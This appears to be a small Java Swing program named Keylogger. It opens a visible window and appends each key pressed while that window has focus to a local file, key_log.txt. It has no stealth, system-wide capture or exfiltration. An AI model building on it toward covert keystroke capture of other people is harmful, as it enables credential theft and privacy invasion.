import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import javax.swing.JFrame;
import java.io.FileWriter;
import java.io.IOException;

public class Keylogger extends JFrame implements KeyListener {

    private static final long serialVersionUID = 1L;
    private static final String LOG_FILE = "key_log.txt";

    public Keylogger() {
        setTitle("Keylogger");
        setSize(400, 400);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        addKeyListener(this);
    }

    @Override
    public void keyPressed(KeyEvent e) {
        logKey(e);
    }

    @Override
    public void keyReleased(KeyEvent e) {
        // Not used
    }

    @Override
    public void keyTyped(KeyEvent e) {
        // Not used
    }

    private void logKey(KeyEvent e) {
        try (FileWriter fw = new FileWriter(LOG_FILE, true)) {
            fw.write(e.getKeyChar());
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    public static void main(String[] args) {
        Keylogger keylogger = new Keylogger();
        keylogger.setVisible(true);
    }
}
